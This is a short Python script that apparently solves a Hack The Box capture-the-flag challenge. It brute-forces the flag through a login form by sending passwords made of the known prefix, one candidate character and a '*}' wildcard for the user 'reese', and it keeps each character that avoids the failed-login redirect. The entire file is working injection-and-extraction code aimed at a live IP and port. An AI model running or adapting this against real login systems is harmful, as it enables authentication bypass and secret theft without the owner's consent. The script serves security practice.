import requests
import string

url="http://94.237.53.113:38968/login"
headers = {"UserAgent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"}

flag="HTB{"
chars=string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

counter=0
while True:
    if counter==len(chars):
        print(flag+'}')
        break
    
    password=flag+chars[counter]+"*}"
    print("Trying: "+password)
    data={"username":"reese","password":password}

    response=requests.post(url,data=data)

    if (response.url != url + "?message=Authentication%20failed"):
        flag+=chars[counter]
        counter=0
    else:
        counter+=1